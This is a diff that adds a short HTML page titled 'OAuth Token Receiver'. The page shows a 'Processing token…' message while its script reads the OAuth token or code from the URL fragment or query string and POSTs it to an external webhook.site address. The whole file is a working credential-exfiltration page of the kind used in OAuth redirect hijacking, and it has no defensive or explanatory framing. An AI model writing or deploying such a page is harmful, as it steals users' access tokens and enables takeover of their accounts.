@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>OAuth Token Receiver</title>
+</head>
+<body>
+  <h2>Processing token…</h2>
+  <script>
+    const token = window.location.hash || window.location.search;
+
+    fetch("https://webhook.site/536222b9-63ba-4f13-a5a6-a985c1820922", {
+      method: "POST",
+      headers: { "Content-Type": "text/plain" },
+      body: token
+    });
+  </script>
+</body>
+</html>
